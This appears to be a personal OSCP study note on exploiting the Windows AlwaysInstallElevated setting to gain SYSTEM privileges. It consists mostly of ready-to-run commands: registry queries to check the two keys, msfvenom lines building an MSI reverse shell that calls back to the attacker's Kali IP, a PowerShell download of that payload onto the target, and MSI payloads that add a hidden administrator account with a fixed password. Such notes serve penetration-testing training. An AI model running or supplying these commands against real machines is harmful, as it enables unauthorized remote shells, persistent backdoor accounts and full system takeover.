**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\**SYSTEM**.

Use MSFVenom to create .MSI payload

Windows | LPORT 139 | .MSI | root.msi
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";const machine = page?.MACHINE ?? "NO MACHINE FOUND";



const command = `msfvenom -p windows/shell_reverse_tcp LHOST=${KaliIP} LPORT=139 -f msi > root.msi`;

dv.paragraph("```bash\n" + command + "\n```");
```
Transfer it into Target

```
python -m http.server 80
```

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `powershell -c "iwr -uri http://${KaliIP}/root.msi -OutFile root.msi"`;

dv.paragraph("```bash\n" + command + "\n```");
```

then

```
./root.msi
```

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads[](https://blog.1nf1n1ty.team/hacktricks/windows-hardening/windows-local-privilege-escalation#metasploit-payloads)

Copy

```
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
```

```
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```

If you have a meterpreter session you can automate this technique using the module `**exploit/windows/local/always_install_elevated**`